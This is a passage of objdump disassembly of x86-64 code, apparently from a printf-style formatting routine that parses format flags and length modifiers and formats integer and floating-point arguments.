   32c484781:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   32c484787:	4c 89 ee             	mov    %r13,%rsi
   32c48478a:	4d 85 f6             	test   %r14,%r14
   32c48478d:	74 15                	je     0x32c4847a4
   32c48478f:	41 8b 06             	mov    (%r14),%eax
   32c484792:	85 c0                	test   %eax,%eax
   32c484794:	0f 88 1c 08 00 00    	js     0x32c484fb6
   32c48479a:	8d 04 80             	lea    (%rax,%rax,4),%eax
   32c48479d:	8d 44 41 d0          	lea    -0x30(%rcx,%rax,2),%eax
   32c4847a1:	41 89 06             	mov    %eax,(%r14)
   32c4847a4:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   32c4847a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4847af:	00 
   32c4847b0:	84 c0                	test   %al,%al
   32c4847b2:	0f 85 41 ff ff ff    	jne    0x32c4846f9
   32c4847b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4847bf:	00 
   32c4847c0:	8b 8c 24 94 00 00 00 	mov    0x94(%rsp),%ecx
   32c4847c7:	89 c8                	mov    %ecx,%eax
   32c4847c9:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   32c4847d0:	5b                   	pop    %rbx
   32c4847d1:	5e                   	pop    %rsi
   32c4847d2:	5f                   	pop    %rdi
   32c4847d3:	5d                   	pop    %rbp
   32c4847d4:	41 5c                	pop    %r12
   32c4847d6:	41 5d                	pop    %r13
   32c4847d8:	41 5e                	pop    %r14
   32c4847da:	41 5f                	pop    %r15
   32c4847dc:	c3                   	ret
   32c4847dd:	0f 1f 00             	nopl   (%rax)
   32c4847e0:	81 64 24 78 ff fe ff 	andl   $0xfffffeff,0x78(%rsp)
   32c4847e7:	ff 
   32c4847e8:	48 8d 5d 08          	lea    0x8(%rbp),%rbx
   32c4847ec:	41 83 fb 03          	cmp    $0x3,%r11d
   32c4847f0:	0f 84 0f 08 00 00    	je     0x32c485005
   32c4847f6:	41 83 fb 02          	cmp    $0x2,%r11d
   32c4847fa:	0f 84 7f 08 00 00    	je     0x32c48507f
   32c484800:	8b 45 00             	mov    0x0(%rbp),%eax
   32c484803:	41 83 fb 01          	cmp    $0x1,%r11d
   32c484807:	0f 84 90 07 00 00    	je     0x32c484f9d
   32c48480d:	89 c2                	mov    %eax,%edx
   32c48480f:	41 83 fb 05          	cmp    $0x5,%r11d
   32c484813:	0f b6 c0             	movzbl %al,%eax
   32c484816:	48 0f 45 c2          	cmovne %rdx,%rax
   32c48481a:	83 f9 75             	cmp    $0x75,%ecx
   32c48481d:	0f 84 c7 07 00 00    	je     0x32c484fea
   32c484823:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c484828:	48 89 c2             	mov    %rax,%rdx
   32c48482b:	e8 00 e7 ff ff       	call   0x32c482f30
   32c484830:	eb 5e                	jmp    0x32c484890
   32c484832:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c484838:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c48483c:	41 bb 03 00 00 00    	mov    $0x3,%r11d
   32c484842:	4c 89 ee             	mov    %r13,%rsi
   32c484845:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c48484b:	e9 60 ff ff ff       	jmp    0x32c4847b0
   32c484850:	81 4c 24 78 80 00 00 	orl    $0x80,0x78(%rsp)
   32c484857:	00 
   32c484858:	48 8d 5d 08          	lea    0x8(%rbp),%rbx
   32c48485c:	41 83 fb 03          	cmp    $0x3,%r11d
   32c484860:	0f 84 96 07 00 00    	je     0x32c484ffc
   32c484866:	48 63 4d 00          	movslq 0x0(%rbp),%rcx
   32c48486a:	41 83 fb 02          	cmp    $0x2,%r11d
   32c48486e:	74 16                	je     0x32c484886
   32c484870:	41 83 fb 01          	cmp    $0x1,%r11d
   32c484874:	0f 84 2b 07 00 00    	je     0x32c484fa5
   32c48487a:	48 0f be c1          	movsbq %cl,%rax
   32c48487e:	41 83 fb 05          	cmp    $0x5,%r11d
   32c484882:	48 0f 44 c8          	cmove  %rax,%rcx
   32c484886:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   32c48488b:	e8 d0 e1 ff ff       	call   0x32c482a60
   32c484890:	48 89 dd             	mov    %rbx,%rbp
   32c484893:	e9 e8 03 00 00       	jmp    0x32c484c80
   32c484898:	80 7e 01 6c          	cmpb   $0x6c,0x1(%rsi)
   32c48489c:	0f 84 95 06 00 00    	je     0x32c484f37
   32c4848a2:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c4848a6:	41 bb 02 00 00 00    	mov    $0x2,%r11d
   32c4848ac:	4c 89 ee             	mov    %r13,%rsi
   32c4848af:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c4848b5:	e9 f6 fe ff ff       	jmp    0x32c4847b0
   32c4848ba:	41 83 eb 02          	sub    $0x2,%r11d
   32c4848be:	41 83 fb 01          	cmp    $0x1,%r11d
   32c4848c2:	0f 87 2c 06 00 00    	ja     0x32c484ef4
   32c4848c8:	48 8b 5d 00          	mov    0x0(%rbp),%rbx
   32c4848cc:	48 8d 05 55 77 00 00 	lea    0x7755(%rip),%rax        # 0x32c48c028
   32c4848d3:	48 8d 75 08          	lea    0x8(%rbp),%rsi
   32c4848d7:	48 85 db             	test   %rbx,%rbx
   32c4848da:	48 0f 44 d8          	cmove  %rax,%rbx
   32c4848de:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   32c4848e5:	85 c0                	test   %eax,%eax
   32c4848e7:	0f 88 d3 05 00 00    	js     0x32c484ec0
   32c4848ed:	48 63 d0             	movslq %eax,%rdx
   32c4848f0:	48 89 d9             	mov    %rbx,%rcx
   32c4848f3:	e8 48 36 00 00       	call   0x32c487f40
   32c4848f8:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c4848fd:	48 89 d9             	mov    %rbx,%rcx
   32c484900:	89 c2                	mov    %eax,%edx
   32c484902:	e8 a9 dd ff ff       	call   0x32c4826b0
   32c484907:	48 89 f5             	mov    %rsi,%rbp
   32c48490a:	4c 89 eb             	mov    %r13,%rbx
   32c48490d:	e9 aa fd ff ff       	jmp    0x32c4846bc
   32c484912:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484916:	83 4c 24 78 04       	orl    $0x4,0x78(%rsp)
   32c48491b:	4c 89 ee             	mov    %r13,%rsi
   32c48491e:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c484924:	e9 87 fe ff ff       	jmp    0x32c4847b0
   32c484929:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c48492d:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   32c484931:	48 83 c5 08          	add    $0x8,%rbp
   32c484935:	83 c8 20             	or     $0x20,%eax
   32c484938:	89 44 24 78          	mov    %eax,0x78(%rsp)
   32c48493c:	a8 04                	test   $0x4,%al
   32c48493e:	0f 84 d5 03 00 00    	je     0x32c484d19
   32c484944:	8b 59 08             	mov    0x8(%rcx),%ebx
   32c484947:	48 8b 09             	mov    (%rcx),%rcx
   32c48494a:	49 89 c8             	mov    %rcx,%r8
   32c48494d:	49 89 c9             	mov    %rcx,%r9
   32c484950:	44 0f bf d3          	movswl %bx,%r10d
   32c484954:	48 89 da             	mov    %rbx,%rdx
   32c484957:	49 c1 e8 20          	shr    $0x20,%r8
   32c48495b:	47 8d 1c 12          	lea    (%r10,%r10,1),%r11d
   32c48495f:	41 81 e0 ff ff ff 7f 	and    $0x7fffffff,%r8d
   32c484966:	45 0f b7 db          	movzwl %r11w,%r11d
   32c48496a:	41 09 c8             	or     %ecx,%r8d
   32c48496d:	44 89 c1             	mov    %r8d,%ecx
   32c484970:	f7 d9                	neg    %ecx
   32c484972:	44 09 c1             	or     %r8d,%ecx
   32c484975:	c1 e9 1f             	shr    $0x1f,%ecx
   32c484978:	44 09 d9             	or     %r11d,%ecx
   32c48497b:	41 bb fe ff 00 00    	mov    $0xfffe,%r11d
   32c484981:	41 29 cb             	sub    %ecx,%r11d
   32c484984:	41 c1 eb 10          	shr    $0x10,%r11d
   32c484988:	0f 85 4e 05 00 00    	jne    0x32c484edc
   32c48498e:	66 85 db             	test   %bx,%bx
   32c484991:	0f 88 c9 05 00 00    	js     0x32c484f60
   32c484997:	66 81 e2 ff 7f       	and    $0x7fff,%dx
   32c48499c:	0f 84 ae 05 00 00    	je     0x32c484f50
   32c4849a2:	66 81 fa ff 7f       	cmp    $0x7fff,%dx
   32c4849a7:	75 09                	jne    0x32c4849b2
   32c4849a9:	45 85 c0             	test   %r8d,%r8d
   32c4849ac:	0f 84 48 07 00 00    	je     0x32c4850fa
   32c4849b2:	66 81 ea ff 3f       	sub    $0x3fff,%dx
   32c4849b7:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c4849bc:	4c 89 c9             	mov    %r9,%rcx
   32c4849bf:	e8 5c f7 ff ff       	call   0x32c484120
   32c4849c4:	e9 b7 02 00 00       	jmp    0x32c484c80
   32c4849c9:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
   32c4849d0:	ff ff ff ff 
   32c4849d4:	41 83 eb 02          	sub    $0x2,%r11d
   32c4849d8:	41 83 fb 01          	cmp    $0x1,%r11d
   32c4849dc:	0f 86 e1 01 00 00    	jbe    0x32c484bc3
   32c4849e2:	8b 45 00             	mov    0x0(%rbp),%eax
   32c4849e5:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   32c4849ea:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c4849ef:	4c 89 eb             	mov    %r13,%rbx
   32c4849f2:	ba 01 00 00 00       	mov    $0x1,%edx
   32c4849f7:	48 83 c5 08          	add    $0x8,%rbp
   32c4849fb:	88 44 24 60          	mov    %al,0x60(%rsp)
   32c4849ff:	e8 2c de ff ff       	call   0x32c482830
   32c484a04:	e9 b3 fc ff ff       	jmp    0x32c4846bc
   32c484a09:	45 85 d2             	test   %r10d,%r10d
   32c484a0c:	75 12                	jne    0x32c484a20
   32c484a0e:	83 4c 24 78 40       	orl    $0x40,0x78(%rsp)
   32c484a13:	66 90                	xchg   %ax,%ax
   32c484a15:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c484a1c:	00 00 00 00 
   32c484a20:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484a24:	4c 89 ee             	mov    %r13,%rsi
   32c484a27:	e9 84 fd ff ff       	jmp    0x32c4847b0
   32c484a2c:	4d 85 f6             	test   %r14,%r14
   32c484a2f:	0f 84 34 01 00 00    	je     0x32c484b69
   32c484a35:	41 f6 c2 05          	test   $0x5,%r10b
   32c484a39:	0f 85 e3 04 00 00    	jne    0x32c484f22
   32c484a3f:	8b 45 00             	mov    0x0(%rbp),%eax
   32c484a42:	48 8d 55 08          	lea    0x8(%rbp),%rdx
   32c484a46:	41 89 06             	mov    %eax,(%r14)
   32c484a49:	85 c0                	test   %eax,%eax
   32c484a4b:	0f 88 3e 06 00 00    	js     0x32c48508f
   32c484a51:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484a55:	48 89 d5             	mov    %rdx,%rbp
   32c484a58:	4c 89 ee             	mov    %r13,%rsi
   32c484a5b:	45 31 f6             	xor    %r14d,%r14d
   32c484a5e:	e9 4d fd ff ff       	jmp    0x32c4847b0
   32c484a63:	45 85 d2             	test   %r10d,%r10d
   32c484a66:	75 b8                	jne    0x32c484a20
   32c484a68:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484a6c:	81 4c 24 78 00 01 00 	orl    $0x100,0x78(%rsp)
   32c484a73:	00 
   32c484a74:	4c 89 ee             	mov    %r13,%rsi
   32c484a77:	e9 34 fd ff ff       	jmp    0x32c4847b0
   32c484a7c:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c484a80:	8b 9c 24 94 00 00 00 	mov    0x94(%rsp),%ebx
   32c484a87:	f6 c4 40             	test   $0x40,%ah
   32c484a8a:	75 09                	jne    0x32c484a95
   32c484a8c:	39 9c 24 98 00 00 00 	cmp    %ebx,0x98(%rsp)
   32c484a93:	7e 15                	jle    0x32c484aaa
   32c484a95:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   32c484a9a:	f6 c4 20             	test   $0x20,%ah
   32c484a9d:	0f 85 cd 05 00 00    	jne    0x32c485070
   32c484aa3:	48 63 c3             	movslq %ebx,%rax
   32c484aa6:	c6 04 02 25          	movb   $0x25,(%rdx,%rax,1)
   32c484aaa:	83 c3 01             	add    $0x1,%ebx
   32c484aad:	89 9c 24 94 00 00 00 	mov    %ebx,0x94(%rsp)
   32c484ab4:	4c 89 eb             	mov    %r13,%rbx
   32c484ab7:	e9 00 fc ff ff       	jmp    0x32c4846bc
   32c484abc:	45 85 d2             	test   %r10d,%r10d
   32c484abf:	0f 85 5b ff ff ff    	jne    0x32c484a20
   32c484ac5:	44 89 54 24 3c       	mov    %r10d,0x3c(%rsp)
   32c484aca:	44 89 5c 24 20       	mov    %r11d,0x20(%rsp)
   32c484acf:	81 4c 24 78 00 10 00 	orl    $0x1000,0x78(%rsp)
   32c484ad6:	00 
   32c484ad7:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   32c484ade:	00 00 
   32c484ae0:	e8 ab 39 00 00       	call   0x32c488490
   32c484ae5:	48 8d 4c 24 5e       	lea    0x5e(%rsp),%rcx
   32c484aea:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   32c484aef:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   32c484af5:	48 8b 50 08          	mov    0x8(%rax),%rdx
   32c484af9:	e8 22 35 00 00       	call   0x32c488020
   32c484afe:	44 8b 5c 24 20       	mov    0x20(%rsp),%r11d
   32c484b03:	44 8b 54 24 3c       	mov    0x3c(%rsp),%r10d
   32c484b08:	85 c0                	test   %eax,%eax
   32c484b0a:	7e 0d                	jle    0x32c484b19
   32c484b0c:	0f b7 54 24 5e       	movzwl 0x5e(%rsp),%edx
   32c484b11:	66 89 94 24 90 00 00 	mov    %dx,0x90(%rsp)
   32c484b18:	00 
   32c484b19:	89 84 24 8c 00 00 00 	mov    %eax,0x8c(%rsp)
   32c484b20:	e9 fb fe ff ff       	jmp    0x32c484a20
   32c484b25:	45 85 d2             	test   %r10d,%r10d
   32c484b28:	0f 85 f2 fe ff ff    	jne    0x32c484a20
   32c484b2e:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484b32:	81 4c 24 78 00 08 00 	orl    $0x800,0x78(%rsp)
   32c484b39:	00 
   32c484b3a:	4c 89 ee             	mov    %r13,%rsi
   32c484b3d:	e9 6e fc ff ff       	jmp    0x32c4847b0
   32c484b42:	45 85 d2             	test   %r10d,%r10d
   32c484b45:	0f 85 d5 fe ff ff    	jne    0x32c484a20
   32c484b4b:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484b4f:	81 4c 24 78 00 04 00 	orl    $0x400,0x78(%rsp)
   32c484b56:	00 
   32c484b57:	4c 89 ee             	mov    %r13,%rsi
   32c484b5a:	e9 51 fc ff ff       	jmp    0x32c4847b0
   32c484b5f:	41 83 fa 01          	cmp    $0x1,%r10d
   32c484b63:	0f 86 5c 04 00 00    	jbe    0x32c484fc5
   32c484b69:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484b6d:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c484b73:	4c 89 ee             	mov    %r13,%rsi
   32c484b76:	e9 35 fc ff ff       	jmp    0x32c4847b0
   32c484b7b:	44 89 f9             	mov    %r15d,%ecx
   32c484b7e:	4c 89 eb             	mov    %r13,%rbx
   32c484b81:	e8 22 39 00 00       	call   0x32c4884a8
   32c484b86:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   32c484b8b:	48 89 c1             	mov    %rax,%rcx
   32c484b8e:	e8 ed dd ff ff       	call   0x32c482980
   32c484b93:	e9 24 fb ff ff       	jmp    0x32c4846bc
   32c484b98:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484b9c:	3c 68                	cmp    $0x68,%al
   32c484b9e:	0f 84 b3 04 00 00    	je     0x32c485057
   32c484ba4:	4c 89 ee             	mov    %r13,%rsi
   32c484ba7:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   32c484bad:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c484bb3:	e9 f8 fb ff ff       	jmp    0x32c4847b0
   32c484bb8:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
   32c484bbf:	ff ff ff ff 
   32c484bc3:	8b 45 00             	mov    0x0(%rbp),%eax
   32c484bc6:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   32c484bcb:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c484bd0:	4c 89 eb             	mov    %r13,%rbx
   32c484bd3:	ba 01 00 00 00       	mov    $0x1,%edx
   32c484bd8:	48 83 c5 08          	add    $0x8,%rbp
   32c484bdc:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   32c484be1:	e8 ca da ff ff       	call   0x32c4826b0
   32c484be6:	e9 d1 fa ff ff       	jmp    0x32c4846bc
   32c484beb:	48 8b 55 00          	mov    0x0(%rbp),%rdx
   32c484bef:	48 63 84 24 94 00 00 	movslq 0x94(%rsp),%rax
   32c484bf6:	00 
   32c484bf7:	48 83 c5 08          	add    $0x8,%rbp
   32c484bfb:	41 83 fb 05          	cmp    $0x5,%r11d
   32c484bff:	0f 84 4b 04 00 00    	je     0x32c485050
   32c484c05:	41 83 fb 01          	cmp    $0x1,%r11d
   32c484c09:	0f 84 78 04 00 00    	je     0x32c485087
   32c484c0f:	41 83 fb 02          	cmp    $0x2,%r11d
   32c484c13:	74 0a                	je     0x32c484c1f
   32c484c15:	41 83 fb 03          	cmp    $0x3,%r11d
   32c484c19:	0f 84 8f 03 00 00    	je     0x32c484fae
   32c484c1f:	89 02                	mov    %eax,(%rdx)
   32c484c21:	eb 5d                	jmp    0x32c484c80
   32c484c23:	45 85 d2             	test   %r10d,%r10d
   32c484c26:	75 0a                	jne    0x32c484c32
   32c484c28:	39 7c 24 78          	cmp    %edi,0x78(%rsp)
   32c484c2c:	0f 84 39 03 00 00    	je     0x32c484f6b
   32c484c32:	48 8b 55 00          	mov    0x0(%rbp),%rdx
   32c484c36:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c484c3b:	48 83 c5 08          	add    $0x8,%rbp
   32c484c3f:	4c 89 eb             	mov    %r13,%rbx
   32c484c42:	b9 78 00 00 00       	mov    $0x78,%ecx
   32c484c47:	e8 e4 e2 ff ff       	call   0x32c482f30
   32c484c4c:	e9 6b fa ff ff       	jmp    0x32c4846bc
   32c484c51:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c484c55:	48 8b 55 00          	mov    0x0(%rbp),%rdx
   32c484c59:	48 83 c5 08          	add    $0x8,%rbp
   32c484c5d:	83 c8 20             	or     $0x20,%eax
   32c484c60:	89 44 24 78          	mov    %eax,0x78(%rsp)
   32c484c64:	a8 04                	test   $0x4,%al
   32c484c66:	74 62                	je     0x32c484cca
   32c484c68:	db 2a                	fldt   (%rdx)
   32c484c6a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   32c484c6f:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   32c484c74:	db 7c 24 40          	fstpt  0x40(%rsp)
   32c484c78:	e8 83 f1 ff ff       	call   0x32c483e00
   32c484c7d:	0f 1f 00             	nopl   (%rax)
   32c484c80:	4c 89 eb             	mov    %r13,%rbx
   32c484c83:	e9 34 fa ff ff       	jmp    0x32c4846bc
   32c484c88:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c484c8c:	48 8b 55 00          	mov    0x0(%rbp),%rdx
   32c484c90:	48 83 c5 08          	add    $0x8,%rbp
   32c484c94:	83 c8 20             	or     $0x20,%eax
   32c484c97:	89 44 24 78          	mov    %eax,0x78(%rsp)
   32c484c9b:	a8 04                	test   $0x4,%al
   32c484c9d:	0f 84 8b 01 00 00    	je     0x32c484e2e
   32c484ca3:	db 2a                	fldt   (%rdx)
   32c484ca5:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   32c484caa:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   32c484caf:	db 7c 24 40          	fstpt  0x40(%rsp)
   32c484cb3:	e8 e8 f1 ff ff       	call   0x32c483ea0
   32c484cb8:	eb c6                	jmp    0x32c484c80
   32c484cba:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c484cbe:	48 8b 55 00          	mov    0x0(%rbp),%rdx
   32c484cc2:	48 83 c5 08          	add    $0x8,%rbp
   32c484cc6:	a8 04                	test   $0x4,%al
   32c484cc8:	75 9e                	jne    0x32c484c68
   32c484cca:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   32c484ccf:	dd 44 24 20          	fldl   0x20(%rsp)
   32c484cd3:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   32c484cd8:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   32c484cdd:	db 7c 24 40          	fstpt  0x40(%rsp)
   32c484ce1:	e8 1a f1 ff ff       	call   0x32c483e00
   32c484ce6:	eb 98                	jmp    0x32c484c80
   32c484ce8:	45 85 d2             	test   %r10d,%r10d
   32c484ceb:	0f 85 a5 01 00 00    	jne    0x32c484e96
   32c484cf1:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484cf5:	81 4c 24 78 00 02 00 	orl    $0x200,0x78(%rsp)
   32c484cfc:	00 
   32c484cfd:	4c 89 ee             	mov    %r13,%rsi
   32c484d00:	e9 ab fa ff ff       	jmp    0x32c4847b0
   32c484d05:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c484d09:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   32c484d0d:	48 83 c5 08          	add    $0x8,%rbp
   32c484d11:	a8 04                	test   $0x4,%al
   32c484d13:	0f 85 2b fc ff ff    	jne    0x32c484944
   32c484d19:	49 89 c8             	mov    %rcx,%r8
   32c484d1c:	89 ca                	mov    %ecx,%edx
   32c484d1e:	49 c1 e8 20          	shr    $0x20,%r8
   32c484d22:	f7 da                	neg    %edx
   32c484d24:	45 89 c1             	mov    %r8d,%r9d
   32c484d27:	09 ca                	or     %ecx,%edx
   32c484d29:	41 81 e1 ff ff ff 7f 	and    $0x7fffffff,%r9d
   32c484d30:	c1 ea 1f             	shr    $0x1f,%edx
   32c484d33:	44 09 ca             	or     %r9d,%edx
   32c484d36:	41 b9 00 00 f0 7f    	mov    $0x7ff00000,%r9d
   32c484d3c:	41 39 d1             	cmp    %edx,%r9d
   32c484d3f:	0f 88 97 01 00 00    	js     0x32c484edc
   32c484d45:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   32c484d4a:	dd 44 24 20          	fldl   0x20(%rsp)
   32c484d4e:	db 7c 24 20          	fstpt  0x20(%rsp)
   32c484d52:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   32c484d57:	66 85 d2             	test   %dx,%dx
   32c484d5a:	79 06                	jns    0x32c484d62
   32c484d5c:	0c 80                	or     $0x80,%al
   32c484d5e:	89 44 24 78          	mov    %eax,0x78(%rsp)
   32c484d62:	44 89 c0             	mov    %r8d,%eax
   32c484d65:	41 81 e0 00 00 f0 7f 	and    $0x7ff00000,%r8d
   32c484d6c:	25 ff ff 0f 00       	and    $0xfffff,%eax
   32c484d71:	41 81 f8 00 00 f0 7f 	cmp    $0x7ff00000,%r8d
   32c484d78:	41 0f 95 c1          	setne  %r9b
   32c484d7c:	09 c8                	or     %ecx,%eax
   32c484d7e:	0f 95 c1             	setne  %cl
   32c484d81:	41 08 c9             	or     %cl,%r9b
   32c484d84:	0f 85 c5 00 00 00    	jne    0x32c484e4f
   32c484d8a:	44 09 c0             	or     %r8d,%eax
   32c484d8d:	0f 84 bc 00 00 00    	je     0x32c484e4f
   32c484d93:	89 d1                	mov    %edx,%ecx
   32c484d95:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c484d9a:	48 8d 15 99 72 00 00 	lea    0x7299(%rip),%rdx        # 0x32c48c03a
   32c484da1:	81 e1 00 80 00 00    	and    $0x8000,%ecx
   32c484da7:	e8 24 dc ff ff       	call   0x32c4829d0
   32c484dac:	e9 cf fe ff ff       	jmp    0x32c484c80
   32c484db1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c484db8:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c484dbc:	48 8b 55 00          	mov    0x0(%rbp),%rdx
   32c484dc0:	48 83 c5 08          	add    $0x8,%rbp
   32c484dc4:	83 c8 20             	or     $0x20,%eax
   32c484dc7:	89 44 24 78          	mov    %eax,0x78(%rsp)
   32c484dcb:	a8 04                	test   $0x4,%al
   32c484dcd:	74 2a                	je     0x32c484df9
   32c484dcf:	db 2a                	fldt   (%rdx)
   32c484dd1:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   32c484dd6:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   32c484ddb:	db 7c 24 40          	fstpt  0x40(%rsp)
   32c484ddf:	e8 9c f1 ff ff       	call   0x32c483f80
   32c484de4:	e9 97 fe ff ff       	jmp    0x32c484c80
   32c484de9:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c484ded:	48 8b 55 00          	mov    0x0(%rbp),%rdx
   32c484df1:	48 83 c5 08          	add    $0x8,%rbp
   32c484df5:	a8 04                	test   $0x4,%al
   32c484df7:	75 d6                	jne    0x32c484dcf
   32c484df9:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   32c484dfe:	dd 44 24 20          	fldl   0x20(%rsp)
   32c484e02:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   32c484e07:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   32c484e0c:	db 7c 24 40          	fstpt  0x40(%rsp)
   32c484e10:	e8 6b f1 ff ff       	call   0x32c483f80
   32c484e15:	e9 66 fe ff ff       	jmp    0x32c484c80
   32c484e1a:	8b 44 24 78          	mov    0x78(%rsp),%eax
   32c484e1e:	48 8b 55 00          	mov    0x0(%rbp),%rdx
   32c484e22:	48 83 c5 08          	add    $0x8,%rbp
   32c484e26:	a8 04                	test   $0x4,%al
   32c484e28:	0f 85 75 fe ff ff    	jne    0x32c484ca3
   32c484e2e:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   32c484e33:	dd 44 24 20          	fldl   0x20(%rsp)
   32c484e37:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   32c484e3c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   32c484e41:	db 7c 24 40          	fstpt  0x40(%rsp)
   32c484e45:	e8 56 f0 ff ff       	call   0x32c483ea0
   32c484e4a:	e9 31 fe ff ff       	jmp    0x32c484c80
   32c484e4f:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   32c484e54:	66 81 e2 ff 7f       	and    $0x7fff,%dx
   32c484e59:	0f 84 2e 01 00 00    	je     0x32c484f8d
   32c484e5f:	66 81 fa 00 3c       	cmp    $0x3c00,%dx
   32c484e64:	0f 8f 1a 01 00 00    	jg     0x32c484f84
   32c484e6a:	44 0f bf c2          	movswl %dx,%r8d
   32c484e6e:	b9 01 3c 00 00       	mov    $0x3c01,%ecx
   32c484e73:	44 29 c1             	sub    %r8d,%ecx
   32c484e76:	48 d3 e8             	shr    %cl,%rax
   32c484e79:	01 ca                	add    %ecx,%edx
   32c484e7b:	66 81 ea fc 3f       	sub    $0x3ffc,%dx
   32c484e80:	48 c1 e8 03          	shr    $0x3,%rax
   32c484e84:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c484e89:	48 89 c1             	mov    %rax,%rcx
   32c484e8c:	e8 8f f2 ff ff       	call   0x32c484120
   32c484e91:	e9 ea fd ff ff       	jmp    0x32c484c80
   32c484e96:	41 83 fa 04          	cmp    $0x4,%r10d
   32c484e9a:	0f 84 78 01 00 00    	je     0x32c485018
   32c484ea0:	b9 30 00 00 00       	mov    $0x30,%ecx
   32c484ea5:	48 89 f2             	mov    %rsi,%rdx
   32c484ea8:	4c 89 ee             	mov    %r13,%rsi
   32c484eab:	41 83 fa 02          	cmp    $0x2,%r10d
   32c484eaf:	0f 85 d5 f8 ff ff    	jne    0x32c48478a
   32c484eb5:	41 ba 03 00 00 00    	mov    $0x3,%r10d
   32c484ebb:	e9 ca f8 ff ff       	jmp    0x32c48478a
   32c484ec0:	48 89 d9             	mov    %rbx,%rcx
   32c484ec3:	e8 00 36 00 00       	call   0x32c4884c8
   32c484ec8:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c484ecd:	48 89 d9             	mov    %rbx,%rcx
   32c484ed0:	89 c2                	mov    %eax,%edx
   32c484ed2:	e8 d9 d7 ff ff       	call   0x32c4826b0
   32c484ed7:	e9 2b fa ff ff       	jmp    0x32c484907
   32c484edc:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   32c484ee1:	48 8d 15 4e 71 00 00 	lea    0x714e(%rip),%rdx        # 0x32c48c036
   32c484ee8:	31 c9                	xor    %ecx,%ecx
   32c484eea:	e8 e1 da ff ff       	call   0x32c4829d0
   32c484eef:	e9 8c fd ff ff       	jmp    0x32c484c80
   32c484ef4:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   32c484ef8:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   32c484efd:	48 83 c5 08          	add    $0x8,%rbp
   32c484f01:	4c 89 eb             	mov    %r13,%rbx
   32c484f04:	e8 77 da ff ff       	call   0x32c482980
   32c484f09:	e9 ae f7 ff ff       	jmp    0x32c4846bc
   32c484f0e:	4c 89 ee             	mov    %r13,%rsi
